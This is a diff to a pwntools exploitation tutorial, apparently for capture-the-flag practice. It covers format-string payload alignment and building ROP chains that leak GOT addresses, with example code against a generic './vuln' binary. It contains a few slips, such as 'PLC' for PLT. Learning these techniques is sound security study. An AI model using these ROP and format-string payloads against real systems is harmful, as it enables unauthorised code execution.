@@ -225,7 +225,7 @@ vbuf_addr = int(string_addr, 16)
 
 ## Alignment
 
-Sometimes the data you are sending is less than expected for packing and unpacking. This doesn't work too well in terms of alignment, especially if each item on the stack is 8 bytes and your payload is only 4. The first thing that comes to mind here is in the event that you have a format string exploit point and you want to leak the absolute address in the GOT. In this case, you can always left-justify your payload and pack the rest with a known value.
+Sometimes the data you are sending is less than expected for packing and unpacking. This doesn't work too well in terms of alignment, especially if each item on the stack is 8 bytes and your payload is only 4. The first thing that comes to mind here is in the event that you have a format string exploit point and you want to leak the absolute address in the GOT. In this case, you can always left-justify your payload with the `.ljust()` string/bytestring function and pack the rest with null bytes.
 
 ```python
 payload = (b'%%%d$s' % i + b'AAAA') + p64(absolute_address_of_GOT_entry)
@@ -543,14 +543,68 @@ syscall
 
 ## ROP Chains
 
-If you give pwntools a good review from their documentation, you'd be surprised at exactly what you can do with their built-in ROP chain handler. First, before we do anything, we'll have to establish a ROP object. We can do this like so:
+If you give pwntools a good review from their documentation, you'd be surprised at exactly what you can do with their built-in ROP chain handler. But before I go on, I'd like to go over some of the basics when it comes to using ROP gadgets. The "manual" way is to run the binary through an external application like `ropper` or `ROPGadget` to dump a list of gadgets we can use. It will list a bunch of rudimentary functions that all end in a `ret` command, which allows you to return back to where you called the gadget entirely. _However_ it's important to know that a gadget found using any of these applications will print out the _offset_ of the binary where that gadget is located. That means that if you actually want to use the gadget you'll need the absolute address, so that means you'll need to somehow leak the location of the base of the code beforehand and simply add the offset of the gadget to it to access it directly.
+
+Finding the base of the `.text` section (or PIE base) is outside the scope of this document, but the super-abridged version is if you can find a way to leak the address of an object such as a symbol or variable or whatever, you can determine the offset of that object using something like [Ghidra](https://ghidra-sre.org) or something, and simply subtract it from the code base to get your PIE base.
+
+The point here though is that you will have to add the discovered code base location to the offset of each discovered ROP gadget to access that gadget in memory. Unless of course you tell pwntools where the address is!
+
 
 ```python
 exe = context.binary = ELF("./vuln")
+
+# Let's say somehow we leaked an address, discovered the
+# address of the base of the code as 0xff000000
+exe.address = 0xff000000
+
+# Now that we've done that, the ROP gadgets we can use will
+# automatically add the offset to the exe.location value,
+# giving the exact location of the gadget. Nice for readability.
+
+# Now set up the rop object using the executable we defined.
 rop = ROP(exe)
 ```
 
-Now we can use the `rop` object to determine how best to proceed. First, we can get a list of all the gadgets that pwntools was able to detect from the supplied binary, like so:
+### How ROP works manually
+
+As an example, I will try to use a very simple ROP gadget that prints out the location of the `puts` function in the GOT. To do that, we need to use a `pop rdi; ret` gadget to move the address in the GOT into the `rdi` register before we call the `puts@PLC` function. Manually, it would look something like this:
+
+```python
+pop_rdi = 0x10c
+puts_plc = 0x7f0014df
+puts_got = 0x7f0059cd
+
+leaked_base = 0x55df3000
+
+payload = b'A'*50                       # padding
+payload += pack(leaked_base + pop_rdi)  # pop_rdi gadget
+payload += pack(puts_got)               # address in the got
+payload += pack(puts_plc)               # execute puts
+
+p.send(payload)
+```
+
+### How to ROP like you own the place
+
+The above addresses are all made up but you get the idea. You have to research all the address locations and set them as variables. This is fine of course, but the above can be done in pwntools very easily. To accomplish the same thing as the above, this code is functionally equivalent:
+
+```python
+exe = context.binary = ELF('./vuln')
+
+# ... leak the address somehow...
+exe.address = 0x55df3000
+
+# build the ROP object
+rop = ROP(exe)
+rop.puts(exe.got.puts)
+p.send(flat({50: rop}))
+```
+
+Pwntools will set up the gadgets to put the `puts` address in the GOT into the `rdi` register, then call the function from the PLC, all while packing the data appropriately. From there it should print out the address for you to ingest. And if you had a more complicated rop chain that you needed to add, you can just keep adding more commands like `rop.printf(exe.got.printf)` or whatever. Each new command will append to the rop chain for you to send off.
+
+### Other gadgets
+
+You can get a list of the rop gadgets you can use:
 
 ```python
 rop.gadgets
@@ -576,24 +630,25 @@ rop.gadgets
 """
 ```
 
-You can see everything it has found. Now to build the ropchain. Say that I had leaked the `puts()` function at the Procedure Linkage Table (PLT) and want to obtain the GOT address of that function. If I had an overflow point, I could use a ropchain to leak that value. Since `puts()` expects the first argument to be in `RDI`, I can create that chain with:
+You can see everything it has found. But understand that this is usually significantly smaller than what other tools like `ropper` or `ROPGadget` can find! Sometimes you need to reference one of those tools to find a gadget that suits your needs. But if we do have that gadget, we can easily add this to the rop chain as before by issuing a `rop.raw()` function.
 
 ```python
-rop(rdi=exe.plt.puts)
+exe = context.binary = ELF('./vuln')
 
-print(rop.dump())
+# ... leak the address somehow...
+exe.address = 0x55df3000
 
-"""
-0x0000:           0x13c3 pop rdi; ret
-0x0008:           0x1030 puts
-"""
-```
+# build the ROP object
+rop = ROP(exe)
 
-As you can see, it sets up the ropchain properly to hit the `pop rdi; ret` instruction, which will add the address of the `puts()` function in the PLT as the next argument. I can now add the address of the `puts()` function in the PLT to call it, followed by the next instruction that should run, such as `main@PLT`. I can access the ropchain with the `bytes()` function.
+# Discovered weird rop gadget that pwntools filtered out
+sub_rsp = 0x10ca      # sub rsp 0x28, ret
 
-```python
-payload = bytes(rop) + p64(exe.plt.puts) + p64(exe.plt.main)
-p.sendline(payload)
+# Now add the discovered address to the ropchain. Don't
+# forget to add it to the base address, pwntools won't
+# add it with the raw() function. Though it will pack
+# the data appropriately!
+rop.raw(exe.address + sub_rsp)
 ```
 
 As I learn more, I'll add to this section. I feel like I'm only scratching the surface with the `rop` module in pwntools.
